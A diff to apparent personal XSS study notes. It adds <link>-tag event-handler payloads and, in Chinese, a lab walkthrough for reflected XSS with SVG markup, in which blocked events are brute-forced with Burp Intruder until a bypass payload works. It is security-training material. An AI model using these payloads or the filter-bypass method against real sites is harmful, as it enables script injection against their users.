@@ -20,3 +20,7 @@ https://www.w3schools.com/tags/tag_link.asp
 <link rel=stylesheet href=1 onerror=alert(1)>
 <link onfocus=alert(1) id=x tabindex=1 style=display:block>
 <link href=validstyles.css rel=stylesheet onload=alert(1)>
+
+lab: Reflected XSS with some SVG markup allowed
+当输入<svg onload=alert()>时发现提示event not allow. 所以首先想到的是把burp xss cheetsheet中的全部event copy出来，然后放到burp intruder中去试。
+发现走不通，所以考虑去all payload thing github上看看有没有其它没有考虑到的payload.最终找到payload可以解决问题。
